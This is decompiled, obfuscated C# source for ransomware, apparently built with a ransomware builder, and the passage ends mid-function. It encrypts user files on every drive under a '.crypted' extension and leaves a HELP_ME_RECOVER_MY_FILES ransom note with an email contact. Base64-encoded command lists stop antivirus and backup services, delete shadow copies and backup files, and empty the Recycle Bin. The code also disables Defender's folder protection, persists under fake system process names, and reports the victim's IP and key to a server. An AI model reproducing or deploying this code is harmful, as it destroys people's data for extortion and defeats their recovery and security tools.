using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace OedchgEuvSrX;

internal class RdLlDKYVGTt
{
	public class QyBLOmDQkbX
	{
		private static StringCollection FuAqBzGoru = new StringCollection();

		private static List<string> KjSgSPCGstzNrsB = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			KjSgSPCGstzNrsB.Clear();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(CmEnmHNMSUiP("UmFuc29tQnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("HELP_ME_RECOVER_MY_FILES") && !text.EndsWith(".crypted") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(JsDNBHoAusk))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(OnsCBQGisPpLuf) * 1024.0 * 1024.0 && nZYFUQJApkbjG == "YES")
							{
								KjSgSPCGstzNrsB.Add(text);
							}
							else if (File.Exists(text) && nZYFUQJApkbjG == "NO")
							{
								KjSgSPCGstzNrsB.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				array3 = array2;
				foreach (string root2 in array3)
				{
					WalkDirectoryTree(root2);
				}
			}
			return KjSgSPCGstzNrsB;
		}
	}

	[CompilerGenerated]
	private sealed class oWYWlhDBuiOp
	{
		public string[] ukjQkreRxdVzp;

		public string[] RjhRAzpayoF;

		public string dpnLfDozvcB;

		public string eDgwhoNYBLYt;
	}

	[CompilerGenerated]
	private sealed class CysXJQvXMvCHaZ
	{
		public oWYWlhDBuiOp LYGCiycKEP;

		public string YvyDOhLNzgZwekX;

		public void _003CCrypt_003Eb__7()
		{
			UptglIayBKt(YvyDOhLNzgZwekX, LYGCiycKEP.ukjQkreRxdVzp, LYGCiycKEP.eDgwhoNYBLYt, LYGCiycKEP.RjhRAzpayoF, LYGCiycKEP.dpnLfDozvcB);
		}
	}

	public static string rDUBWgotnFXyeRg = "EVET";

	public static string[] RIhIdzrZUaS;

	public static IEnumerable<DirectoryInfo> MQPvLArVpofU;

	public static byte[] oBtwYOpAzqwja = null;

	public static DirectoryInfo EqmvXQDlLM;

	public static string nZYFUQJApkbjG = "NO";

	public static string OnsCBQGisPpLuf = "100000000";

	public static List<string> xaqMLrcbfeQ = new List<string>();

	public static List<string> tmQgDzuRYiAMC = new List<string>();

	public static string LspoBrlAxolJi = "NO";

	public static string ozyGQcgadAHgSri = "";

	public static string NRUHliJKzyCTo = "NO";

	public static int MegFxNqTaHYKQ = 0;

	public static string LsKJTnBRaR = "YES";

	public static string jxlpWURCeoU = "NO";

	public static string SKeUVEvxOS = "NO";

	public static string LxIocQrvjUyg = "0";

	public static string mImCyagaMr = "NO";

	public static string lBltJjFXUjjH = "NO";

	public static string evuauaSrKSrdB = "NO";

	public static string FVlZGAMxwKFGO = "NO";

	public static List<string> MmmTRSBKoYFZ = new List<string>
	{
		CmEnmHNMSUiP("bHNhc3MuZXhl"),
		CmEnmHNMSUiP("c3ZjaHN0LmV4ZQ=="),
		CmEnmHNMSUiP("Y3Jjc3MuZXhl"),
		CmEnmHNMSUiP("Y2hyb21lMzIuZXhl"),
		CmEnmHNMSUiP("ZmlyZWZveC5leGU="),
		CmEnmHNMSUiP("Y2FsYy5leGU="),
		CmEnmHNMSUiP("bXlzcWxkLmV4ZQ=="),
		CmEnmHNMSUiP("ZGxsaHN0LmV4ZQ=="),
		CmEnmHNMSUiP("b3BlcmEzMi5leGU="),
		CmEnmHNMSUiP("bWVtb3AuZXhl"),
		CmEnmHNMSUiP("c3Bvb2xjdi5leGU="),
		CmEnmHNMSUiP("Y3RmbW9tLmV4ZQ=="),
		CmEnmHNMSUiP("U2t5cGVBcHAuZXhl")
	};

	public static List<string> yKUDxGEVObKrNk = new List<string>();

	public static string RImhBDRBqVj = "YES";

	public static string cGxWuVRMJOZj = "NO";

	public static string yBxwbziLCjDC = "NO";

	public static List<string> yONTCwwfkXlFhtU = new List<string>();

	public static string BcxyEpYLXSg = "NO";

	private static string sftYZEIbRUJ = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string ibaCbmLmbpX = "YES";

	public static string aboOYNZBIoi = "NO";

	public static List<string> YroURdHFqfiezEkV = new List<string>
	{
		CmEnmHNMSUiP("c3RvcCBhdnBzdXMgL3k="),
		CmEnmHNMSUiP("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		CmEnmHNMSUiP("c3RvcCBtZmV3YyAveQ=="),
		CmEnmHNMSUiP("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		CmEnmHNMSUiP("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		CmEnmHNMSUiP("c3RvcCBEZWZXYXRjaCAveQ=="),
		CmEnmHNMSUiP("c3RvcCBjY0V2dE1nciAveQ=="),
		CmEnmHNMSUiP("c3RvcCBjY1NldE1nciAveQ=="),
		CmEnmHNMSUiP("c3RvcCBTYXZSb2FtIC95"),
		CmEnmHNMSUiP("c3RvcCBSVFZzY2FuIC95"),
		CmEnmHNMSUiP("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		CmEnmHNMSUiP("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		CmEnmHNMSUiP("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		CmEnmHNMSUiP("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		CmEnmHNMSUiP("c3RvcCBZb29CYWNrdXAgL3k="),
		CmEnmHNMSUiP("c3RvcCBZb29JVCAveQ=="),
		CmEnmHNMSUiP("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		CmEnmHNMSUiP("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		CmEnmHNMSUiP("c3RvcCBWU05BUFZTUyAveQ=="),
		CmEnmHNMSUiP("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		CmEnmHNMSUiP("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		CmEnmHNMSUiP("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		CmEnmHNMSUiP("c3RvcCB2ZWVhbSAveQ=="),
		CmEnmHNMSUiP("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		CmEnmHNMSUiP("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		CmEnmHNMSUiP("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		CmEnmHNMSUiP("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		CmEnmHNMSUiP("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		CmEnmHNMSUiP("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		CmEnmHNMSUiP("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		CmEnmHNMSUiP("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		CmEnmHNMSUiP("c3RvcCBBY3JTY2gyU3ZjIC95"),
		CmEnmHNMSUiP("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		CmEnmHNMSUiP("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		CmEnmHNMSUiP("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		CmEnmHNMSUiP("c3RvcCBzb3Bob3MgL3k=")
	};

	public static List<string> ZnVfaqcIsjfDbOt = new List<string>
	{
		CmEnmHNMSUiP("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		CmEnmHNMSUiP("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		CmEnmHNMSUiP("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		CmEnmHNMSUiP("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> ooCIhXbNkIRDY = new List<string>
	{
		CmEnmHNMSUiP("L0lNIG1zcHViLmV4ZSAvRg=="),
		CmEnmHNMSUiP("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		CmEnmHNMSUiP("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> IKXRwdTrZjIXNv = new List<string>
	{
		CmEnmHNMSUiP("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		CmEnmHNMSUiP("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		CmEnmHNMSUiP("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> ZjQqYgaDiWTv = new List<string>
	{
		CmEnmHNMSUiP("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		CmEnmHNMSUiP("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		CmEnmHNMSUiP("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		CmEnmHNMSUiP("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		CmEnmHNMSUiP("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		CmEnmHNMSUiP("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string opcdhLBTRz = "NO";

	public static string voJCBBNJBW = "NO";

	internal static DateTime XZaVwevOhtWiZDsrwE = new DateTime(2000, 1, 1);

	internal static DateTime wcjcJIHUPEBs = new DateTime(2100, 1, 1);

	public static string sEaoDNzvqb = "NO";

	public static string vvkqkxGWSBd = "10";

	public static string OhuBGYvGJKWQtZ = "YES";

	public static string QlRIVpvwjFG = "NO";

	public static string xLfFwZQxjJhw = "NO";

	public static string nFyIkDAkODlVdGd = "YES";

	public static string UihcgXhiGAQWVLO = "NO";

	public static string usBTaskzfJ = "NO";

	public static List<string> EsdLifEKRrvz = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string pRTLpBFwdcGPRXJ = "NO";

	public static string qWxNlyprnnbj = "1";

	public static string bgTGEtObWTcOXA = "NO";

	public static string TYOdIhsVEc = "NO";

	public static string VDNzMxhXFPTh = "YES";

	public static string aSlhCoyMCUCI = string.Empty;

	public static string GSkTwedQrjUkldz = "YES";

	public static string frZEYcXaMHEguw = "YES";

	public static string HrWBrEHpTDqRTC = "YES";

	public static string bWCOnomnhUUq = "SW5mb3JtYXRpb24uLi4=";

	public static string OkqZNavXZrXk = "DQoqKiogQVRURU5USU9OICoqKg0KWW91ciBGaWxlIExvY2tlZCBCeSAiTWlsaXRhcnkgQWxnb3JpdGhtIiBBbmQgV2lwZWQuIA0KRm9yIFJlY292ZXJ5IFlvdXIgRmlsZXMgQ29udGFjdCA6IGwxdTF0MUBzZWNtYWlsLnBybw==";

	public static string ghTvHfLEShdZTvS = "NO";

	public static string siZdSGUpIgM = "NO";

	public static string ttAmWytDSins = "NO";

	public static string xGvocjwEhfU = "YES";

	public static string XELlpburoJIXBk = "NO";

	public static string NnxTEDvBsEo = "LOGONISOFF";

	public static string HPVDycuqHaU = "NO";

	public static string aVSHeuZcweZ = "NO";

	public static string JsDNBHoAusk = "mystartup.lnk";

	public static string uxoTDxRvaxB = "YES";

	public static string fkVORfAVOg = "NO";

	private static void Main(string[] args)
	{
		//IL_08dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_08fe: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			EnuSapcAhHq.AJWcGsiTrAQmHr(sftYZEIbRUJ);
		}
		catch (Exception)
		{
		}
		if (SKeUVEvxOS == "YES")
		{
			Thread.Sleep(int.Parse(LxIocQrvjUyg));
		}
		if (VDNzMxhXFPTh == "YES")
		{
			Thread thread = new Thread(wlCVKRWvBCU.OlbnNUvraWAkNIM);
			thread.IsBackground = true;
			thread.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && UihcgXhiGAQWVLO == "YES")
		{
			try
			{
				jMIMNDWyknDuf(CmEnmHNMSUiP("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (evuauaSrKSrdB == "YES" && !IJQqbjFftgY.UqFWPsBjHOx())
		{
			IJQqbjFftgY.lOaRfsLaZnvmr();
		}
		if (cGxWuVRMJOZj == "YES" && IJQqbjFftgY.UqFWPsBjHOx())
		{
			new qfjQGFANnktF().TlDNPWybLtwX(ZnxdFITIhLzsny: false);
			new qfjQGFANnktF().YnyVeiwoPxRekhO();
		}
		if (jxlpWURCeoU == "YES")
		{
			lzYfnqfTbz.ZKVmEjHciVw();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (NRUHliJKzyCTo == "YES" && fileName != text2)
		{
			Thread thread2 = new Thread(CzfizONZaASKJKS);
			thread2.IsBackground = true;
			thread2.Priority = ThreadPriority.Highest;
			thread2.Start();
		}
		if (LspoBrlAxolJi == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				MegFxNqTaHYKQ = yVcPJbPuGeFzEe(0, MmmTRSBKoYFZ.Count);
				File.Copy(fileName, text + MmmTRSBKoYFZ[MegFxNqTaHYKQ], overwrite: true);
				Process.Start(text + MmmTRSBKoYFZ[MegFxNqTaHYKQ]);
				XlOnxoNESE();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (opcdhLBTRz == "YES" && DateTime.Now < XZaVwevOhtWiZDsrwE)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (voJCBBNJBW == "YES" && DateTime.Now > wcjcJIHUPEBs)
			{
				XlOnxoNESE();
			}
		}
		catch
		{
		}
		foreach (string item in YroURdHFqfiezEkV)
		{
			mSZHpMYIEf("net.exe", item);
		}
		foreach (string item2 in ZnVfaqcIsjfDbOt)
		{
			mSZHpMYIEf("sc.exe", item2);
		}
		foreach (string item3 in ooCIhXbNkIRDY)
		{
			mSZHpMYIEf("taskkill.exe", item3);
		}
		foreach (string item4 in IKXRwdTrZjIXNv)
		{
			mSZHpMYIEf("vssadmin.exe", item4);
		}
		foreach (string item5 in ZjQqYgaDiWTv)
		{
			mSZHpMYIEf("del.exe", item5);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			mSZHpMYIEf("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
		}
		if (RImhBDRBqVj == "YES" && vffOZEquQBbSJm())
		{
			DTlZjsQnTvqP.YjxUeifqMskQS();
		}
		if (!(aboOYNZBIoi == "YES"))
		{
		}
		if (OhuBGYvGJKWQtZ == "NO")
		{
			ozyGQcgadAHgSri = clTCrgKkUmqy.QglWefldbmhy(32);
		}
		else
		{
			ozyGQcgadAHgSri = "L8AOOP7RZ5TU13YMVOCYKWR8FI0YT4YA";
		}
		string text3 = VYYCwPzSuUlD.EeRhTLKvHZZ(ozyGQcgadAHgSri);
		if (frZEYcXaMHEguw == "YES")
		{
			wmkgQqLZhqBQx();
		}
		NQkPfEAxcRIM.KRfWMWGbyiGNlL(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), JsDNBHoAusk), WoZooFcrEZT(text3), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (GSkTwedQrjUkldz == "YES" && args.Length > 0)
		{
			try
			{
				if (!File.Exists(args[0]))
				{
					oMDFbddahqmh(new string[1] { args[0] }, new string[101]
					{
						"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
						"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
						"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
						"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
						"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
						"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
						"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
						"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
						"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
						"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
						"7z"
					}, new string[0], ozyGQcgadAHgSri, ".crypted");
					MessageBox.Show("Done!");
				}
				else
				{
					MessageBox.Show("This procedure is for local directories, not for individual files!");
				}
				return;
			}
			catch
			{
				MessageBox.Show("This procedure is for local directories, not for individual files!");
				return;
			}
		}
		try
		{
			oMDFbddahqmh(new string[30]
			{
				"A:\\",
				"B:\\",
				"C:\\",
				"D:\\",
				"E:\\",
				"F:\\",
				"G:\\",
				"H:\\",
				"I:\\",
				"J:\\",
				"K:\\",
				"L:\\",
				"M:\\",
				"N:\\",
				"O:\\",
				"P:\\",
				"Q:\\",
				"R:\\",
				"S:\\",
				"T:\\",
				"U:\\",
				"V:\\",
				"W:\\",
				"X:\\",
				"Y:\\",
				"Z:\\",
				Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\",
				Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\",
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\"
			}, new string[101]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
				"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
				"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
				"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
				"7z"
			}, new string[0], ozyGQcgadAHgSri, ".crypted");
		}
		catch
		{
			XlOnxoNESE();
		}
		ozyGQcgadAHgSri = clTCrgKkUmqy.QglWefldbmhy(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
			streamWriter.WriteLine(CmEnmHNMSUiP("DQoqKiogQVRURU5USU9OICoqKg0KWW91ciBGaWxlIExvY2tlZCBCeSAiTWlsaXRhcnkgQWxnb3JpdGhtIiBBbmQgV2lwZWQuIA0KRm9yIFJlY292ZXJ5IFlvdXIgRmlsZXMgQ29udGFjdCA6IGwxdTF0MUBzZWNtYWlsLnBybw=="));
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine(CmEnmHNMSUiP("S2V5IElkZW50aWZpZXI6IA=="));
			streamWriter.WriteLine(text3);
			if (ibaCbmLmbpX == "NO")
			{
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(CmEnmHNMSUiP("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(yONTCwwfkXlFhtU.Count));
			}
		}
		else
		{
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
		}
		foreach (string item6 in yKUDxGEVObKrNk)
		{
			if (item6 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
			{
				continue;
			}
			try
			{
				if (!File.Exists(item6 + "\\HELP_ME_RECOVER_MY_FILES.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", item6 + "\\HELP_ME_RECOVER_MY_FILES.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item6 + "\\HELP_ME_RECOVER_MY_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
				}
			}
			catch (Exception)
			{
			}
		}
		if (BcxyEpYLXSg == "YES")
		{
			try
			{
				if (ibaCbmLmbpX == "NO")
				{
					IMqeXbiZFcK.XbWdUEQukGTKu("URL", "USERNAME", "ACCESO", CmEnmHNMSUiP("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(CmEnmHNMSUiP("aHR0cDovL2ljYW5oYXppcC5jb20=")) + CmEnmHNMSUiP("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + CmEnmHNMSUiP("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(yONTCwwfkXlFhtU.Count) + "\r\n" + CmEnmHNMSUiP("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(yONTCwwfkXlFhtU) + "\r\n" + CmEnmHNMSUiP("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					IMqeXbiZFcK.XbWdUEQukGTKu("URL", "USERNAME", "ACCESO", CmEnmHNMSUiP("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + CmEnmHNMSUiP("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + CmEnmHNMSUiP("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(yONTCwwfkXlFhtU) + "\r\n" + CmEnmHNMSUiP("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (FVlZGAMxwKFGO == "YES")
		{
			try
			{
				ltxPWhxHDagl.OJZOpnQfEO(new Uri("aHR0cDovL3d3dy5teV93YWxscGFwZXJfbG9jYXRpb24uY29tL3dhbGxwYXBlci5ibXA="));
			}
			catch
			{
			}
		}
		Process.Start(CmEnmHNMSUiP("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
		if (frZEYcXaMHEguw == "YES")
		{
			if (HrWBrEHpTDqRTC == "YES" && !string.IsNullOrEmpty(bWCOnomnhUUq) && !string.IsNullOrEmpty(OkqZNavXZrXk))
			{
				QOYSuFqaozDpOS(bWCOnomnhUUq, OkqZNavXZrXk);
			}
			else
			{
				QOYSuFqaozDpOS();
			}
		}
		if (NnxTEDvBsEo != "LOGONISOFF")
		{
			NcXWEJlhWauf(NnxTEDvBsEo);
		}
		if (!string.IsNullOrEmpty(aSlhCoyMCUCI))
		{
			try
			{
				File.Delete(aSlhCoyMCUCI);
			}
			catch
			{
			}
		}
		if (rDUBWgotnFXyeRg == "EVET")
		{
			XlOnxoNESE();
		}
	}

	public static void CzfizONZaASKJKS()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(CmEnmHNMSUiP("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), CmEnmHNMSUiP("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int yVcPJbPuGeFzEe(int POHKjmuiaEw, int PoEqXhhKaFNvP)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(POHKjmuiaEw, PoEqXhhKaFNvP);
	}

	public static List<string> lQxqgeqEXFmgz(string xULzRaQGdquBJz)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(xULzRaQGdquBJz))
		{
			throw new ArgumentException();
		}
		stack.Push(xULzRaQGdquBJz);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
